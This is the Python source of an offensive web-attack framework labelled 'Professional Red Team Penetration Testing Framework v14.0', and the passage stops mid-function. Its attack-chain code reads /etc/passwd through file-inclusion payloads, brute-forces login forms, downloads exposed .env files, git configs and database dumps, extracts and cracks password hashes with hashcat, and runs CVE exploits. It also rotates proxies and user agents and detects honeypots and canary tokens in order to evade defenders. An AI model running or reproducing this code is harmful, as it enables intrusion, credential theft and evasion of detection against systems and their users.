#!/usr/bin/env python3
"""
Professional Red Team Penetration Testing Framework v14.0
Active Exploitation | Attack Chaining | Intelligence Validation
For authorized red team operations and academic research only
"""

import asyncio
import aiohttp
import requests
import sys
import subprocess
import os
import ssl
import socket
import json
import yaml
import csv
import time
import logging
import argparse
import pickle
import hashlib
import resource
import re
import base64
import random
import threading
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, quote, urlencode
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import Fore, Style, init, Back
from jinja2 import Template

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

init(autoreset=True)

# ============================================================
# CONFIGURATION
# ============================================================

WORDLIST_DIR = "/root/SecLists"

def find_wordlist_fallback(base_dir, filename):
    filename_lower = filename.lower()
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.lower() == filename_lower:
                return os.path.join(root, file)
    return None

DEFAULT_CONFIG = {
    'scan_profile': 'aggressive',
    'threads': 20,
    'timeout': 5,
    'delay': 0.02,
    'max_payloads': 2000,
    'output_dir': '/tmp/scan_results',
    'output_formats': ['html', 'json'],
    'resume': False,
    'self_protection': False,
    'proxies_file': None,
    'wordlists': {
        'directories': [
            "/root/SecLists/Discovery/Web-Content/common.txt",
            "/root/SecLists/Discovery/Web-Content/raft-medium-directories.txt",
            "/root/SecLists/Discovery/Web-Content/raft-medium-files.txt",
        ],
        'xss': [
            "/root/SecLists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt",
            "/root/SecLists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt",
        ],
        'sqli': [
            "/root/SecLists/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
        ],
        'lfi': [
            "/root/SecLists/Fuzzing/LFI/Linux/LFI-gracefulsecurity-linux.txt",
        ],
        'command_injection': [
            "/root/SecLists/Fuzzing/command-injection-commix.txt",
        ],
        'subdomains': "/root/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
        'passwords': "/root/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt",
        'top_passwords': "/root/SecLists/Passwords/Common-Credentials/10k-most-common.txt",
        'usernames': "/root/SecLists/Usernames/cirt-default-usernames.txt",
        'parameters': "/root/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt",
    },
    'nvd_api_key': '',
}

SCAN_PROFILES = {
    'stealth': {'threads': 2, 'timeout': 15, 'delay': 1.0, 'max_payloads': 100},
    'normal': {'threads': 5, 'timeout': 10, 'delay': 0.3, 'max_payloads': 500},
    'aggressive': {'threads': 20, 'timeout': 5, 'delay': 0.02, 'max_payloads': 2000},
    'extreme': {'threads': 40, 'timeout': 3, 'delay': 0.01, 'max_payloads': 5000},
}


# ============================================================
# INTELLIGENCE ENGINE (Module 33)
# ============================================================

class IntelligenceEngine:
    """Advanced validation, honeypot detection, and false positive elimination"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.honeypot_indicators = 0
        self.false_positive_indicators = 0
        self.confidence_scores = {}
        self.validated_findings = []
        self.rejected_findings = []
        self.honeypot_findings = []
        
        self.target_profile = {
            'defensive_posture': 'unknown',
            'honeypot_probability': 0.0,
            'waf_detected': False,
            'ids_detected': False,
            'decoy_endpoints': [],
            'tracking_parameters': [],
            'canary_tokens': [],
            'response_anomalies': []
        }
        
        self.honeypot_signatures = {
            'headers': ['x-honeypot', 'x-canary', 'x-trap', 'decoy', 'security-monkey', 'aws-canary', 'canary-token'],
            'body_patterns': ['canary', 'honeypot', 'trap', 'decoy', 'alert', 'unauthorized access detected', 'security incident', 'your ip has been logged', 'incident response'],
            'behaviors': ['instant_403', 'perfect_response', 'tracking_pixel', 'javascript_bait']
        }
        
        self.fp_indicators = {
            'generic_error': ['error', 'exception', 'failed', 'invalid'],
            'default_page': ['welcome', 'default', 'index', 'placeholder'],
            'maintenance': ['maintenance', 'down', 'unavailable'],
            'captcha_only': ['captcha', 'verify', 'human'],
        }

    def validate_finding(self, finding):
        warnings = []
        confidence = 100
        classification = 'VALID'
        
        title = finding.get('title', '').lower()
        desc = finding.get('description', '').lower()
        
        # Honeypot detection
        hp_result = self._detect_honeypot(finding)
        if hp_result['is_honeypot']:
            confidence = max(0, confidence - hp_result['severity'])
            classification = 'HONEYPOT'
            self.honeypot_indicators += 1
            warnings.append(f"🚨 HONEYPOT DETECTED: {hp_result['reason']}")
            self.honeypot_findings.append({'finding': finding, 'reason': hp_result['reason'], 'confidence': hp_result['severity']})
        
        # False positive detection
        fp_result = self._detect_false_positive(finding)
        if fp_result['is_fp']:
            confidence = max(0, confidence - fp_result['severity'])
            if classification != 'HONEYPOT':
                classification = 'FALSE_POSITIVE'
            self.false_positive_indicators += 1
            warnings.append(f"⚠️  FALSE POSITIVE LIKELY: {fp_result['reason']}")
            self.rejected_findings.append({'finding': finding, 'reason': fp_result['reason'], 'confidence': fp_result['severity']})
        
        # Cross-reference validation
        cross_result = self._cross_reference_validate(finding)
        if not cross_result['valid']:
            confidence = max(0, confidence - cross_result['severity'])
            warnings.append(f"❌ CROSS-REFERENCE FAILED: {cross_result['reason']}")
        
        # Behavioral analysis
        beh_result = self._analyze_behavior(finding)
        if not beh_result['valid']:
            confidence = max(0, confidence - beh_result['severity'])
            warnings.append(f"️  BEHAVIORAL ANOMALY: {beh_result['reason']}")
        
        # Contextual validation
        ctx_result = self._contextual_validate(finding)
        if not ctx_result['valid']:
            confidence = max(0, confidence - ctx_result['severity'])
            warnings.append(f" CONTEXTUAL ISSUE: {ctx_result['reason']}")
        
        # Update target profile
        self._update_target_profile(finding, confidence)
        
        # Final decision
        if confidence >= 80:
            final_status = 'HIGH_CONFIDENCE'
        elif confidence >= 60:
            final_status = 'MEDIUM_CONFIDENCE'
        elif confidence >= 40:
            final_status = 'LOW_CONFIDENCE'
        else:
            final_status = 'REJECTED'
            classification = 'FALSE_POSITIVE'
        
        validated_finding = {
            'original': finding,
            'confidence': confidence,
            'classification': classification,
            'status': final_status,
            'warnings': warnings,
            'timestamp': datetime.now().isoformat()
        }
        self.validated_findings.append(validated_finding)
        self.confidence_scores[finding.get('title', '')] = confidence
        
        is_valid = confidence >= 60 and classification == 'VALID'
        return is_valid, confidence, classification, warnings

    def _detect_honeypot(self, finding):
        result = {'is_honeypot': False, 'severity': 0, 'reason': ''}
        desc = finding.get('description', '').lower()
        
        if any(sig in desc for sig in self.honeypot_signatures['headers']):
            result['is_honeypot'] = True
            result['severity'] = 90
            result['reason'] = 'Honeypot headers detected'
            return result
        
        if any(sig in desc for sig in self.honeypot_signatures['body_patterns']):
            result['is_honeypot'] = True
            result['severity'] = 85
            result['reason'] = 'Honeypot content patterns detected'
            return result
        
        if 'canary' in desc or 'token' in desc:
            result['is_honeypot'] = True
            result['severity'] = 80
            result['reason'] = 'Canary token detected'
            return result
        
        return result

    def _detect_false_positive(self, finding):
        result = {'is_fp': False, 'severity': 0, 'reason': ''}
        desc = finding.get('description', '').lower()
        tool = finding.get('tool', '')
        
        if any(ind in desc for ind in self.fp_indicators['generic_error']):
            if 'sql' not in desc and 'injection' not in desc:
                result['is_fp'] = True
                result['severity'] = 60
                result['reason'] = 'Generic error message'
                return result
        
        if any(ind in desc for ind in self.fp_indicators['default_page']):
            result['is_fp'] = True
            result['severity'] = 70
            result['reason'] = 'Default or placeholder page'
            return result
        
        if any(ind in desc for ind in self.fp_indicators['captcha_only']):
            result['is_fp'] = True
            result['severity'] = 80
            result['reason'] = 'CAPTCHA challenge'
            return result
        
        if tool == 'Nuclei' and 'info' in finding.get('title', '').lower():
            result['is_fp'] = True
            result['severity'] = 40
            result['reason'] = 'Nuclei info-level finding'
            return result
        
        return result

    def _cross_reference_validate(self, finding):
        result = {'valid': True, 'severity': 0, 'reason': ''}
        title = finding.get('title', '').lower()
        
        finding_count = sum(1 for f in self.scanner.results if title in f.get('title', '').lower() and f != finding)
        if finding_count == 0:
            result['severity'] = 20
            result['reason'] = 'Single-tool detection'
        
        return result

    def _analyze_behavior(self, finding):
        result = {'valid': True, 'severity': 0, 'reason': ''}
        desc = finding.get('description', '').lower()
        
        if 'delay:' in desc:
            try:
                delay_match = re.search(r'delay:\s*([\d.]+)s', desc)
                if delay_match:
                    delay = float(delay_match.group(1))
                    if delay < 0.1 or delay > 30:
                        result['valid'] = False
                        result['severity'] = 50
                        result['reason'] = f'Suspicious response time: {delay}s'
            except:
                pass
        
        return result

    def _contextual_validate(self, finding):
        result = {'valid': True, 'severity': 0, 'reason': ''}
        title = finding.get('title', '').lower()
        
        if 'localhost' in title or '127.0.0.1' in title:
            if 'localhost' not in self.scanner.target_url:
                result['valid'] = False
                result['severity'] = 80
                result['reason'] = 'Localhost reference on remote target'
        
        return result

    def _update_target_profile(self, finding, confidence):
        if confidence < 60:
            self.target_profile['honeypot_probability'] += 0.05
        if 'waf' in finding.get('tool', '').lower():
            self.target_profile['waf_detected'] = True
        self.target_profile['honeypot_probability'] = min(1.0, self.target_profile['honeypot_probability'])

    def get_validation_summary(self):
        total = len(self.validated_findings)
        valid = sum(1 for f in self.validated_findings if f['classification'] == 'VALID')
        return {
            'total_findings': total,
            'valid_findings': valid,
            'honeypots_detected': len(self.honeypot_findings),
            'false_positives_filtered': len(self.rejected_findings),
            'average_confidence': sum(f['confidence'] for f in self.validated_findings) / max(1, total),
            'honeypot_probability': self.target_profile['honeypot_probability']
        }

    def generate_validation_report(self):
        summary = self.get_validation_summary()
        print(f"\n{Fore.CYAN}{'='*70}\n[INTELLIGENCE ENGINE] VALIDATION SUMMARY\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}Total Findings:{Style.RESET_ALL} {summary['total_findings']}")
        print(f"{Fore.GREEN}Valid:{Style.RESET_ALL} {summary['valid_findings']} ({summary['valid_findings']/max(1,summary['total_findings'])*100:.1f}%)")
        print(f"{Fore.RED}Honeypots:{Style.RESET_ALL} {summary['honeypots_detected']}")
        print(f"{Fore.MAGENTA}False Positives:{Style.RESET_ALL} {summary['false_positives_filtered']}")
        print(f"{Fore.CYAN}Avg Confidence:{Style.RESET_ALL} {summary['average_confidence']:.1f}%\n")
        
        if summary['honeypots_detected'] > 0:
            print(f"{Fore.RED}⚠️  HONEYPOT ACTIVITY DETECTED - Review findings carefully{Style.RESET_ALL}\n")
        
        if self.rejected_findings:
            print(f"{Fore.MAGENTA}[REJECTED FINDINGS]{Style.RESET_ALL}")
            for i, finding in enumerate(self.rejected_findings[:5], 1):
                print(f"  {i}. {finding['finding']['title']} - {finding['reason']}\n")


# ============================================================
# SELF-PROTECTION SYSTEM (Optional Module)
# ============================================================

class BlockDetector:
    BLOCK_TYPES = {
        'rate_limit': {'codes': [429], 'patterns': ['rate limit', 'too many requests']},
        'waf_block': {'codes': [403, 406, 419], 'patterns': ['blocked', 'access denied', 'incident']},
        'captcha': {'codes': [], 'patterns': ['captcha', 'recaptcha', 'verify you']},
        'ip_ban': {'codes': [403], 'patterns': ['ip banned', 'your ip']},
    }
    
    def classify(self, response):
        if response is None:
            return 'connection_failed'
        status = response.status_code
        text = response.text.lower()
        headers = str(response.headers).lower()
        combined = text + headers
        for block_type, criteria in self.BLOCK_TYPES.items():
            if status in criteria['codes']:
                return block_type
            for pattern in criteria['patterns']:
                if pattern in combined:
                    return block_type
        return 'none'


class ProxyRotator:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.failed_proxies = set()
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
    
    def get_proxy(self):
        if not self.proxies:
            return None
        available = [p for p in self.proxies if p not in self.failed_proxies]
        if not available:
            self.failed_proxies.clear()
            available = self.proxies
        if not available:
            return None
        proxy = random.choice(available)
        if ':' in proxy and '@' not in proxy:
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return {'http': proxy, 'https': proxy}
    
    def mark_failed(self, proxy_dict):
        if proxy_dict:
            self.failed_proxies.add(proxy_dict.get('http', '').replace('http://', '').replace('https://', ''))
    
    def rotate(self):
        return self.get_proxy()


class UserAgentRotator:
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    
    def get_random(self):
        return random.choice(self.USER_AGENTS)


class TimingController:
    def __init__(self, base_delay=0.5, jitter_range=0.3):
        self.base_delay = base_delay
        self.jitter_range = jitter_range
        self.request_count = 0
    
    def wait(self):
        self.request_count += 1
        jitter = random.uniform(-self.jitter_range, self.jitter_range) * self.base_delay
        delay = max(0.01, self.base_delay + jitter)
        if self.request_count % 10 == 0:
            time.sleep(random.uniform(2.0, 5.0))
        time.sleep(delay)
    
    def adapt_to_blocking(self, block_type):
        multipliers = {'rate_limit': 3.0, 'waf_block': 5.0, 'captcha': 10.0, 'ip_ban': 0.0}
        multiplier = multipliers.get(block_type, 1.0)
        if multiplier > 0:
            self.base_delay *= multiplier
            self.jitter_range *= 1.5


class CircuitBreaker:
    def __init__(self, failure_threshold=15, recovery_timeout=60):
        self.failure_count = 0
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.last_failure_time = None
        self.state = 'closed'
    
    def record_failure(self):
        self.failure_count += 1
        self.last_failure_time = time.time()
        if self.failure_count >= self.failure_threshold:
            self.state = 'open'
            return True
        return False
    
    def record_success(self):
        self.failure_count = max(0, self.failure_count - 1)
        if self.failure_count == 0:
            self.state = 'closed'
    
    def can_proceed(self):
        if self.state == 'closed':
            return True
        elif self.state == 'open':
            if self.last_failure_time and time.time() - self.last_failure_time > self.recovery_timeout:
                self.state = 'half-open'
                return True
            return False
        return True


# ============================================================
# HELPER CLASSES
# ============================================================

class CVEDatabase:
    def __init__(self, api_key=''):
        self.api_key = api_key
        self.base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.cache = {}

    def lookup(self, product, version=''):
        cache_key = f"{product}:{version}"
        if cache_key in self.cache:
            return self.cache[cache_key]
        results = []
        try:
            keyword = f"{product} {version}".strip()
            params = {'keywordSearch': keyword, 'resultsPerPage': 5}
            if self.api_key:
                params['apiKey'] = self.api_key
            resp = requests.get(self.base_url, params=params, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                for vuln in data.get('vulnerabilities', []):
                    cve = vuln.get('cve', {})
                    cve_id = cve.get('id', 'N/A')
                    description = cve.get('descriptions', [{}])[0].get('value', '')
                    metrics = cve.get('metrics', {})
                    cvss_score = 'N/A'
                    for metric_key in ['cvssMetricV31', 'cvssMetricV30', 'cvssMetricV2']:
                        if metric_key in metrics and metrics[metric_key]:
                            cvss_data = metrics[metric_key][0].get('cvssData', {})
                            cvss_score = cvss_data.get('baseScore', 'N/A')
                            break
                    results.append({'cve_id': cve_id, 'description': description[:200], 'cvss_score': cvss_score})
        except Exception:
            pass
        self.cache[cache_key] = results
        return results


class PerformanceTracker:
    def __init__(self):
        self.start_time = None
        self.end_time = None
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.phase_times = {}
        self.blocks_detected = {'rate_limit': 0, 'waf_block': 0, 'captcha': 0, 'ip_ban': 0}

    def start(self): self.start_time = time.time()
    def stop(self): self.end_time = time.time()
    def record_request(self, success=True):
        self.total_requests += 1
        if success: self.successful_requests += 1
        else: self.failed_requests += 1
    def record_block(self, block_type):
        if block_type in self.blocks_detected:
            self.blocks_detected[block_type] += 1
    def start_phase(self, phase_name): self.phase_times[phase_name] = {'start': time.time(), 'end': None}
    def end_phase(self, phase_name):
        if phase_name in self.phase_times: self.phase_times[phase_name]['end'] = time.time()
    def get_report(self):
        elapsed = (self.end_time or time.time()) - (self.start_time or time.time())
        mem_usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024
        return {
            'total_duration': f"{elapsed:.2f}s",
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'requests_per_second': round(self.total_requests / max(elapsed, 0.01), 2),
            'memory_peak_mb': round(mem_usage, 2),
            'blocks_detected': self.blocks_detected,
            'phase_breakdown': {name: f"{(times['end'] or time.time()) - times['start']:.2f}s" for name, times in self.phase_times.items()}
        }


# ============================================================
# ATTACK CHAIN ENGINE (Module 26)
# ============================================================

class AttackChain:
    def __init__(self, name, description, steps):
        self.name = name
        self.description = description
        self.steps = steps
        self.context = {}
        self.executed_steps = []
        self.successful = False


class AttackChainEngine:
    def __init__(self, scanner):
        self.scanner = scanner
        self.chains = []
        self.executed_chains = []
        self.intelligence_engine = IntelligenceEngine(scanner)
        self._register_chains()

    def _register_chains(self):
        self.chains.append(AttackChain(
            name="LFI_to_Admin_Access",
            description="Use LFI to read config files, extract credentials, login as admin",
            steps=[self._step_extract_credentials_via_lfi, self._step_login_with_extracted_creds, self._step_verify_admin_access]
        ))
        self.chains.append(AttackChain(
            name="CVE_Exploitation_Chain",
            description="Use discovered versions to find and exploit known CVEs",
            steps=[self._step_find_exploitable_cves, self._step_attempt_cve_exploit, self._step_verify_code_execution]
        ))
        self.chains.append(AttackChain(
            name="Database_to_Cracked_Creds",
            description="Find DB dumps, extract hashes, crack them, use credentials",
            steps=[self._step_find_database_dumps, self._step_extract_hashes_from_dumps, self._step_crack_hashes_with_hashcat, self._step_use_cracked_credentials]
        ))
        self.chains.append(AttackChain(
            name="Backup_to_Full_Compromise",
            description="Find backup files, extract secrets, achieve full compromise",
            steps=[self._step_download_backup_files, self._step_extract_secrets_from_code, self._step_use_secrets_for_access]
        ))
        self.chains.append(AttackChain(
            name="WAF_Bypass_Chain",
            description="Use detected WAF to craft specific bypass payloads",
            steps=[self._step_analyze_waf_rules, self._step_craft_waf_bypass_payloads, self._step_execute_bypass_exploit]
        ))
        self.chains.append(AttackChain(
            name="Logic_Flaw_Exploitation",
            description="Use race conditions to bypass business logic limits",
            steps=[self._step_identify_race_target, self._step_exploit_race_condition, self._step_verify_impact]
        ))

    def analyze_and_execute_chains(self):
        self.scanner.perf.start_phase('attack_chains')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 26] ATTACK CHAIN ENGINE + INTELLIGENCE VALIDATION\n{'='*70}{Style.RESET_ALL}\n")
        
        self._collect_intelligence()
        
        print(f"{Fore.YELLOW}[*] Validating {len(self.scanner.results)} findings...{Style.RESET_ALL}")
        validated_count = 0
        for finding in self.scanner.results:
            is_valid, confidence, classification, warnings = self.intelligence_engine.validate_finding(finding)
            if is_valid:
                validated_count += 1
            else:
                if warnings:
                    for warning in warnings[:2]:
                        print(f"  {Fore.YELLOW}[!] {warning}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Validated {validated_count}/{len(self.scanner.results)} findings{Style.RESET_ALL}\n")
        
        viable_chains = self._identify_viable_chains()
        
        if not viable_chains:
            print(f"{Fore.YELLOW}[!] No viable attack chains identified.{Style.RESET_ALL}")
            self.intelligence_engine.generate_validation_report()
            self.scanner.perf.end_phase('attack_chains')
            return
        
        print(f"{Fore.GREEN}[+] Identified {len(viable_chains)} viable attack chains{Style.RESET_ALL}\n")
        
        successful_chains = 0
        for chain in viable_chains:
            print(f"{Fore.CYAN}[*] Executing chain: {chain.name}{Style.RESET_ALL}")
            if self._execute_chain(chain):
                successful_chains += 1
                self.executed_chains.append(chain)
        
        self.intelligence_engine.generate_validation_report()
        
        print(f"\n{Fore.CYAN}{'='*70}\n[CHAIN ENGINE] RESULTS: {successful_chains}/{len(viable_chains)} successful\n{'='*70}{Style.RESET_ALL}")
        
        for chain in self.executed_chains:
            self.scanner.log_result('CRITICAL', f'ATTACK CHAIN SUCCESSFUL: {chain.name}', f'Executed steps: {len(chain.executed_steps)}', 'Attack Chain Engine')
        
        self.scanner.perf.end_phase('attack_chains')

    def _collect_intelligence(self):
        print(f"{Fore.YELLOW}[*] Collecting intelligence from {len(self.scanner.results)} findings...{Style.RESET_ALL}")
        for finding in self.scanner.results:
            desc = finding.get('description', '').lower()
            title = finding.get('title', '').lower()
            
            if 'credential' in desc or 'password' in desc:
                cred_matches = re.findall(r'(?:user|username|pass|password)[:\s=]+([^\s|,\"]+)', finding['description'], re.I)
                self.scanner.context['credentials'].extend(cred_matches)
            
            version_match = re.search(r'(\w+)\s+(\d+\.\d+(?:\.\d+)?)', finding['description'])
            if version_match:
                self.scanner.context['versions'][version_match.group(1)] = version_match.group(2)
            
            hash_patterns = [r'\$2[aby]\$\d+\$[./A-Za-z0-9]{53}', r'\$6\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{86}', r'[a-f0-9]{32}(?![a-f0-9])']
            for pattern in hash_patterns:
                self.scanner.context['hashes'].extend(re.findall(pattern, finding['description']))
            
            if 'race condition' in title or 'toctou' in desc:
                self.scanner.context['logic_flaws'].append({'type': 'race_condition', 'title': title, 'description': desc})
        
        for endpoint in self.scanner.discovered_endpoints:
            path = endpoint.get('path', '').lower()
            if any(ext in path for ext in ['.sql', '.bak', '.dump', '.env', '.config', '.git']):
                self.scanner.context['configs'][endpoint['url']] = path
        
        print(f"{Fore.GREEN}[+] Intelligence: {len(self.scanner.context['credentials'])} creds, {len(self.scanner.context['hashes'])} hashes, {len(self.scanner.context['versions'])} versions, {len(self.scanner.context['logic_flaws'])} logic flaws{Style.RESET_ALL}\n")

    def _identify_viable_chains(self):
        viable = []
        for chain in self.chains:
            score = 0
            if chain.name == "LFI_to_Admin_Access" and any('LFI' in r['title'] for r in self.scanner.results): score += 10
            elif chain.name == "CVE_Exploitation_Chain" and self.scanner.context['versions']: score += 10
            elif chain.name == "Database_to_Cracked_Creds" and (self.scanner.context['hashes'] or any('.sql' in p for p in self.scanner.context['configs'].values())): score += 10
            elif chain.name == "Backup_to_Full_Compromise" and any(ext in p for p in self.scanner.context['configs'].values() for ext in ['.bak', '.sql', '.zip', '.env']): score += 10
            elif chain.name == "WAF_Bypass_Chain" and self.scanner.waf_detected: score += 10
            elif chain.name == "Logic_Flaw_Exploitation" and self.scanner.context.get('logic_flaws'): score += 10
            if score > 0: viable.append(chain)
        return viable

    def _execute_chain(self, chain):
        chain.context = self.scanner.context.copy()
        for i, step in enumerate(chain.steps):
            step_name = step.__name__.replace('_step_', '').replace('_', ' ').title()
            print(f"{Fore.YELLOW}    [Step {i+1}/{len(chain.steps)}] {step_name}{Style.RESET_ALL}")
            try:
                success = step(chain)
                if success:
                    chain.executed_steps.append(step_name)
                    print(f"{Fore.GREEN}        ✓ Step successful{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}        ✗ Step failed{Style.RESET_ALL}")
                    return False
            except Exception as e:
                print(f"{Fore.RED}        ✗ Step error: {e}{Style.RESET_ALL}")
                return False
        chain.successful = True
        return True

    def _step_extract_credentials_via_lfi(self, chain):
        sensitive_files = ['/var/www/html/wp-config.php', '/var/www/html/.env', '/var/www/html/config.php']
        lfi_payloads = ['../../../../etc/passwd', '....//....//....//etc/passwd', '/etc/passwd']
        params_to_test = ['file', 'page', 'include', 'path', 'doc']
        extracted = False
        for param in params_to_test:
            for payload in lfi_payloads:
                resp = self.scanner.make_request('GET', f"{self.scanner.target_url}?{param}={quote(payload)}", timeout=15)
                if resp and 'root:' in resp.text:
                    users = re.findall(r'^([^:]+):[^:]*:\d+:\d+:', resp.text, re.M)
                    chain.context['users'].extend(users[:10])
                    extracted = True
                    break
            if extracted: break
        return extracted

    def _step_login_with_extracted_creds(self, chain):
        if not chain.context.get('users') or not self.scanner.login_pages: return False
        usernames = chain.context['users'][:5]
        passwords = chain.context['credentials'][:20] if chain.context['credentials'] else ['admin', 'password', 'root']
        for login_url in self.scanner.login_pages:
            resp = self.scanner.make_request('GET', login_url)
            if not resp: continue
            soup = BeautifulSoup(resp.text, 'lxml')
            for form in soup.find_all('form'):
                pwd_field = form.find('input', {'type': 'password'})
                user_field = form.find('input', attrs={'name': lambda x: x and any(k in x.lower() for k in ['user', 'name', 'email', 'login'])})
                if not pwd_field or not user_field: continue
                pwd_name = pwd_field.get('name')
                user_name = user_field.get('name')
                action_url = urljoin(login_url, form.get('action', ''))
                method = form.get('method', 'post').lower()
                for user in usernames:
                    for pwd in passwords:
                        data = {user_name: user, pwd_name: pwd}
                        try:
                            if method == 'post':
                                r = self.scanner.session.post(action_url, data=data, allow_redirects=False, timeout=self.scanner.timeout)
                            else:
                                r = self.scanner.session.get(action_url, params=data, allow_redirects=False, timeout=self.scanner.timeout)
                            if r.status_code in [301, 302]:
                                chain.context['authenticated'] = True
                                chain.context['auth_creds'] = (user, pwd)
                                self.scanner.log_result('CRITICAL', 'CHAIN SUCCESS: Login', f'User: {user} | Pass: {pwd}', 'Chain')
                                return True
                        except Exception: continue
        return False

    def _step_verify_admin_access(self, chain):
        if not chain.context.get('authenticated'): return False
        for path in ['/admin', '/dashboard', '/panel']:
            resp = self.scanner.make_request('GET', f"{self.scanner.target_url}{path}")
            if resp and resp.status_code == 200 and len(resp.text) > 500:
                chain.context['admin_access'] = True
                self.scanner.log_result('CRITICAL', 'CHAIN COMPLETE: Admin Access', f'URL: {path}', 'Chain')
                return True
        return chain.context.get('authenticated', False)

    def _step_find_exploitable_cves(self, chain):
        if not chain.context['versions']: return False
        exploitable = []
        for software, version in chain.context['versions'].items():
            cves = self.scanner.cve_db.lookup(software, version)
            for cve in cves:
                cvss = cve.get('cvss_score', 'N/A')
                if cvss != 'N/A':
                    try:
                        if float(cvss) >= 7.0:
                            exploitable.append({'cve_id': cve['cve_id'], 'cvss': cvss, 'software': software, 'version': version})
                    except Exception: pass
        chain.context['exploitable_cves'] = exploitable
        return len(exploitable) > 0

    def _step_attempt_cve_exploit(self, chain):
        for cve_info in chain.context.get('exploitable_cves', []):
            cve_id = cve_info['cve_id']
            template_path = os.path.expanduser(f'~/nuclei-templates/cves/{cve_id[:4]}/{cve_id.lower()}.yaml')
            if os.path.exists(template_path):
                try:
                    cmd = ['nuclei', '-u', self.scanner.target_url, '-t', template_path, '-silent']
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    if proc.stdout.strip():
                        chain.context['exploited_cve'] = cve_id
                        self.scanner.log_result('CRITICAL', f'CVE Exploited: {cve_id}', 'Via Nuclei', 'Chain')
                        return True
                except Exception: pass
        return False

    def _step_verify_code_execution(self, chain):
        return 'exploited_cve' in chain.context

    def _step_find_database_dumps(self, chain):
        dump_paths = ['/backup.sql', '/dump.sql', '/db.sql', '/database.sql']
        found = []
        for path in dump_paths:
            resp = self.scanner.make_request('GET', f"{self.scanner.target_url}{path}")
            if resp and resp.status_code == 200 and len(resp.text) > 100:
                found.append({'url': f"{self.scanner.target_url}{path}", 'content': resp.text[:50000]})
        chain.context['database_dumps'] = found
        return len(found) > 0

    def _step_extract_hashes_from_dumps(self, chain):
        patterns = [(r'\$2[aby]\$\d+\$[./A-Za-z0-9]{53}', 'bcrypt'), (r'\$6\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{86}', 'sha512crypt'), (r'[a-f0-9]{32}(?![a-f0-9])', 'md5')]
        extracted = []
        for dump in chain.context.get('database_dumps', []):
            for pattern, hash_type in patterns:
                for match in re.findall(pattern, dump['content']):
                    extracted.append({'hash': match, 'type': hash_type})
        chain.context['extracted_hashes'] = extracted
        return len(extracted) > 0

    def _step_crack_hashes_with_hashcat(self, chain):
        if not chain.context.get('extracted_hashes'): return False
        hash_file = os.path.join(self.scanner.output_dir, 'chain_hashes.txt')
        with open(hash_file, 'w') as f:
            for h in chain.context['extracted_hashes']:
                f.write(h['hash'] + '\n')
        hashcat_modes = {'md5': '0', 'sha512crypt': '1800', 'bcrypt': '3200'}
        hash_types = [h['type'] for h in chain.context['extracted_hashes']]
        most_common = max(set(hash_types), key=hash_types.count)
        mode = hashcat_modes.get(most_common, '0')
        wordlist = self.scanner.config['wordlists']['passwords']
        if not os.path.exists(wordlist): return False
        cracked_file = os.path.join(self.scanner.output_dir, 'chain_cracked.txt')
        try:
            cmd = ['hashcat', '-m', mode, '-a', '0', hash_file, wordlist, '--force', '--potfile-disable', '--runtime', '120', '-o', cracked_file]
            subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
                with open(cracked_file, 'r') as f:
                    for line in f:
                        if ':' in line:
                            _, password = line.strip().split(':', 1)
                            chain.context['credentials'].append(password)
                return True
        except Exception: pass
        return False

    def _step_use_cracked_credentials(self, chain):
        return self._step_login_with_extracted_creds(chain)

    def _step_download_backup_files(self, chain):
        backup_paths = ['/.env', '/.git/config', '/wp-config.php', '/config.php']
        downloaded = []
        for path in backup_paths:
            resp = self.scanner.make_request('GET', f"{self.scanner.target_url}{path}")
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                downloaded.append({'path': path, 'content': resp.text})
        chain.context['backup_files'] = downloaded
        return len(downloaded) > 0

    def _step_extract_secrets_from_code(self, chain):
        patterns = [(r'API_KEY["\']?\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', 'API_KEY'), (r'password["\']?\s*[=:]\s*["\']([^"\']{4,})["\']', 'PASSWORD'), (r'secret["\']?\s*[=:]\s*["\']([^"\']{8,})["\']', 'SECRET')]
        extracted = []
        for file_info in chain.context.get('backup_files', []):
            for pattern, secret_type in patterns:
